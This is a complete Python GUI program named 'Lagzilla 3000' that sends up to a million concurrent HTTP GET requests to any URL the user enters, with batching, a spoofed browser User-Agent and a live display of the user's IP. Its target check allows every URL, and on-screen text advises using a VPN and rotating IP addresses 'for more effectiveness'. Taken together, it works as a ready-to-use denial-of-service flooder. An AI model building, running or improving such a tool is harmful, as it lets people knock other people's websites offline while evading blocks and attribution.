import tkinter as tk
from tkinter import ttk
import requests
import threading
import time
import os
import sys

running = False
cooldown = False
current_ip = None

REQUEST_LIMIT = 1000000


def gui_update(func):
    root.after(0, func)


def log(text):
    def update():
        output.insert(tk.END, text + "\n")
        output.see(tk.END)

    gui_update(update)


def check_ip_loop():
    global current_ip

    while True:
        try:
            ip = requests.get(
                "https://api.ipify.org",
                timeout=5
            ).text

            if ip != current_ip:
                current_ip = ip

                gui_update(
                    lambda:
                    ip_label.config(
                        text=f"Current IP: {ip}"
                    )
                )

        except Exception:
            gui_update(
                lambda:
                ip_label.config(
                    text="Current IP: Unknown"
                )
            )

        time.sleep(120)


def clamp_settings():
    try:
        count = int(amount_entry.get())

        if count < 1:
            count = 1

        if count > REQUEST_LIMIT:
            count = REQUEST_LIMIT


        delay = float(delay_entry.get())

        if delay < 0:
            delay = 0


        batch = int(batch_entry.get())

        if batch < 1:
            batch = 1

        if batch > count:
            batch = count


        amount_entry.delete(0, tk.END)
        amount_entry.insert(0, str(count))

        delay_entry.delete(0, tk.END)
        delay_entry.insert(0, str(delay))

        batch_entry.delete(0, tk.END)
        batch_entry.insert(0, str(batch))


        return count, delay, batch

    except Exception:
        return None


def is_allowed_target(url):
    return True


def worker():
    global running, cooldown

    url = url_entry.get().strip()
    settings = clamp_settings()

    if not settings:
        gui_update(lambda: status_label.config(text="Invalid settings"))
        return

    count, delay, batch_size = settings

    if not url.startswith(("http://", "https://")):
        gui_update(lambda: status_label.config(text="Invalid URL"))
        return

    if not is_allowed_target(url):
        gui_update(lambda: status_label.config(text="Target not allowed"))
        return

    running = True
    cooldown = False

    gui_update(lambda: (
        start_button.config(state="disabled"),
        stop_button.config(state="normal"),
        status_label.config(
            text=f"Running {count} requests, batches of {batch_size}"
        ),
        progress.config(maximum=count, value=0)
    ))

    import threading
    from concurrent.futures import ThreadPoolExecutor, as_completed

    thread_local = threading.local()

    def get_session():
        if not hasattr(thread_local, "session"):
            session = requests.Session()

            session.headers.update({
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 "
                    "Chrome/120 Safari/537.36"
                ),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            })

            thread_local.session = session

        return thread_local.session


    def request_task(request_id):
        session = get_session()
        start = time.perf_counter()

        try:
            response = session.get(
                url,
                timeout=5
            )

            return {
                "id": request_id,
                "status": response.status_code,
                "time": time.perf_counter() - start,
                "error": None
            }

        except requests.exceptions.Timeout:
            return {
                "id": request_id,
                "status": None,
                "time": None,
                "error": "Timeout"
            }

        except requests.exceptions.ConnectionError as e:
            return {
                "id": request_id,
                "status": None,
                "time": None,
                "error": f"Connection failed: {e}"
            }

        except Exception as e:
            return {
                "id": request_id,
                "status": None,
                "time": None,
                "error": str(e)
            }


    completed = 0

    while running and completed < count:

        current_batch = min(
            batch_size,
            count - completed
        )

        gui_update(
            lambda b=current_batch:
            status_label.config(
                text=f"Running batch of {b}"
            )
        )

        results = []

        with ThreadPoolExecutor(
            max_workers=current_batch
        ) as executor:

            futures = [
                executor.submit(
                    request_task,
                    completed + i + 1
                )
                for i in range(current_batch)
            ]

            for future in as_completed(futures):

                if not running:
                    break

                result = future.result()
                results.append(result)

                completed += 1

                if result["error"]:
                    log(
                        f"Request {result['id']}: "
                        f"{result['error']}"
                    )
                else:
                    log(
                        f"Request {result['id']}: "
                        f"{result['status']} "
                        f"{result['time']:.3f}s"
                    )

                gui_update(
                    lambda c=completed:
                    progress.config(value=c)
                )


        times = [
            r["time"]
            for r in results
            if r["time"] is not None
        ]

        if times:
            log(
                f"Batch complete: {len(results)} requests, "
                f"avg {sum(times)/len(times):.3f}s"
            )


        if running and completed < count:

            stop_time = time.time() + delay

            while running and time.time() < stop_time:
                time.sleep(0.05)


    running = False

    gui_update(lambda: (
        status_label.config(text="Cooldown"),
        start_button.config(state="disabled"),
        stop_button.config(state="disabled")
    ))

    cooldown = True

    time.sleep(2)

    cooldown = False

    gui_update(lambda: (
        status_label.config(text="Ready"),
        start_button.config(state="normal"),
        stop_button.config(state="disabled"),
        progress.config(value=0)
    ))

def start():
    global running

    if not running and not cooldown:

        output.delete(
            "1.0",
            tk.END
        )

        threading.Thread(
            target=worker,
            daemon=True
        ).start()


def stop():
    global running

    running = False

    gui_update(
        lambda:
        status_label.config(
            text="Stopped"
        )
    )


def close():
    global running

    running = False
    root.destroy()


def get_resource_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    return os.path.join(os.path.dirname(__file__), filename)

root = tk.Tk()

icon_path = get_resource_path("icon.ico")

try:
    root.wm_iconbitmap(icon_path)
except Exception as e:
    print("Icon failed:", e)

root.title(
    "Lagzilla 3000"
)

root.geometry(
    "750x700"
)

root.minsize(
    550,
    500
)

root.protocol(
    "WM_DELETE_WINDOW",
    close
)


style = ttk.Style()
style.theme_use(
    "clam"
)


main = ttk.Frame(
    root,
    padding=15
)

main.pack(
    fill="both",
    expand=True
)


main.columnconfigure(
    0,
    weight=1
)

main.rowconfigure(
    10,
    weight=1
)


title = ttk.Label(
    main,
    text="Lagzilla 3000",
    font=(
        "Segoe UI",
        22,
        "bold"
    )
)

title.grid(
    row=0,
    column=0,
    pady=10
)


limit_label = ttk.Label(
    main,
    text=f"Maximum {REQUEST_LIMIT} Requests"
)

limit_label.grid(
    row=1,
    column=0
)


settings = ttk.LabelFrame(
    main,
    text="Settings",
    padding=10
)

settings.grid(
    row=2,
    column=0,
    sticky="ew",
    pady=10
)


settings.columnconfigure(
    1,
    weight=1
)


fields = [
    ("Target URL", "url"),
    ("Requests", "amount"),
    ("Delay", "delay"),
    ("Batch size", "batch")
]


for row, (label, _) in enumerate(fields):

    ttk.Label(
        settings,
        text=label
    ).grid(
        row=row,
        column=0,
        padx=5,
        pady=5
    )


url_entry = ttk.Entry(
    settings
)

url_entry.grid(
    row=0,
    column=1,
    sticky="ew"
)


amount_entry = ttk.Entry(
    settings
)

amount_entry.insert(
    0,
    "10"
)

amount_entry.grid(
    row=1,
    column=1,
    sticky="ew"
)


delay_entry = ttk.Entry(
    settings
)

delay_entry.insert(
    0,
    "1"
)

delay_entry.grid(
    row=2,
    column=1,
    sticky="ew"
)


batch_entry = ttk.Entry(
    settings
)

batch_entry.insert(
    0,
    "3"
)

batch_entry.grid(
    row=3,
    column=1,
    sticky="ew"
)


ip_label = ttk.Label(
    main,
    text="Current IP: Checking..."
)

ip_label.grid(
    row=3,
    column=0,
    pady=5
)

vpn_label = ttk.Label(
    main,
    text="Recommended to use a VPN and regularly rotate your IP address for more effectiveness.",
    wraplength=600,
    foreground="red"
)

vpn_label.grid(row=4, column=0, pady=5)


progress = ttk.Progressbar(
    main,
    mode="determinate"
)

progress.grid(
    row=5,
    column=0,
    sticky="ew",
    pady=10
)


buttons = ttk.Frame(
    main
)

buttons.grid(
    row=6,
    column=0
)


start_button = ttk.Button(
    buttons,
    text="Start",
    command=start
)

start_button.pack(
    side="left",
    padx=10
)


stop_button = ttk.Button(
    buttons,
    text="Stop",
    command=stop
)

stop_button.pack(
    side="left",
    padx=10
)

stop_button.config(
    state="disabled"
)


status_label = ttk.Label(
    main,
    text="Ready"
)

status_label.grid(
    row=7,
    column=0,
    pady=5
)


output_frame = ttk.LabelFrame(
    main,
    text="Output",
    padding=5
)

output_frame.grid(
    row=10,
    column=0,
    sticky="nsew"
)


output_frame.columnconfigure(
    0,
    weight=1
)

output_frame.rowconfigure(
    0,
    weight=1
)


output = tk.Text(
    output_frame,
    wrap="word"
)

output.grid(
    row=0,
    column=0,
    sticky="nsew"
)


threading.Thread(
    target=check_ip_loop,
    daemon=True
).start()


root.mainloop()
